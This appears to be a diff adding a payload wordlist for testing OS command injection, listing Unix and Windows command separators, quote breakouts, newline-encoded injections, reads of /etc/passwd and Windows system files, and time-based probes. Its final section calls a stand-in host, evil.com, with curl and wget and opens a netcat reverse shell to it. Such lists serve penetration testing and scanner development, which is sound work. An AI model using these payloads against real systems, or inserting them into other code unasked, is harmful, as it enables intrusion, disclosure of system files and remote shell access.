@@ -1,0 +1,85 @@
+# Command Injection Payloads
+# Payloads for testing OS command injection
+
+# Unix command separators
+; id
+| id
+|| id
+&& id
+& id
+`id`
+$(id)
+
+# Unix whoami
+; whoami
+| whoami
+|| whoami
+&& whoami
+$(whoami)
+`whoami`
+
+# Windows commands
+& whoami
+| whoami
+|| whoami
+&& whoami
+& dir
+| dir
+
+# Echo test markers
+; echo CMDINJTEST
+| echo CMDINJTEST
+& echo CMDINJTEST
+$(echo CMDINJTEST)
+`echo CMDINJTEST`
+& echo CMDINJTEST
+
+# Breaking out of quotes (Unix)
+'; id; '
+"; id; "
+'; echo CMDINJTEST; '
+' | id | '
+" | id | "
+
+# Breaking out of quotes (Windows)
+'& whoami & '
+"& whoami & "
+'| whoami | '
+
+# Newline injection
+%0aid
+%0d%0aid
+%0awhoami
+%0d%0awhoami
+
+# File reading (Unix)
+; cat /etc/passwd
+| cat /etc/passwd
+$(cat /etc/passwd)
+`cat /etc/passwd`
+; head /etc/passwd
+; tail /etc/passwd
+
+# File reading (Windows)
+& type C:\Windows\System32\drivers\etc\hosts
+| type C:\Windows\win.ini
+& type C:\boot.ini
+
+# Time-based (Unix)
+; sleep 5
+| sleep 5
+& sleep 5
+$(sleep 5)
+`sleep 5`
+; ping -c 5 127.0.0.1
+
+# Time-based (Windows)
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+& timeout 5
+
+# Network calls
+; curl http://evil.com
+| wget http://evil.com
+$(curl http://evil.com)
+; nc -e /bin/sh evil.com 4444
